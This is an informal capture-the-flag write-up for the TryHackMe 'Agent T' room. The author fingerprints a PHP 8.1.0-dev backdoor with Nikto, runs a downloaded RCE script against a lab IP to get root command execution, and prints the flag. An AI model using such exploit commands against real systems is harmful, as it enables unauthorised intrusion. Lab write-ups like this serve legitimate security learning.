#writeups


## Agent T - THM

by reading the hint, I found something interesting, and using 
Nikto I got smth amazing 
`+ /: Retrieved x-powered-by header: PHP/8.1.0-dev.`

and when I look in google I found a RCE for that, I downloaded 
and I'm gonna try to exploit this one, if it possible

```
─$ python3 rceDev.py -u http://10.10.146.227/ -c whoami
[+] Results:
root
```
It works! amazing, now why not some reverse-shell just to get
persistence with the shell, after trying NO results, so catch
the flag manually, make some `ls`, after have that:

`flag{4127d0530abf16d6d23973e3df8dbecb}`

what a speedrun one, I left behind `Expires 37m 14s/59min`




```
Disc: This writeups help me a lot, even if it isnt the correct writeups for 
this box, but the technique are the same.

source: https://infosecwriteups.com/hackthebox-writeup-knife-2a3dd526d11d
```
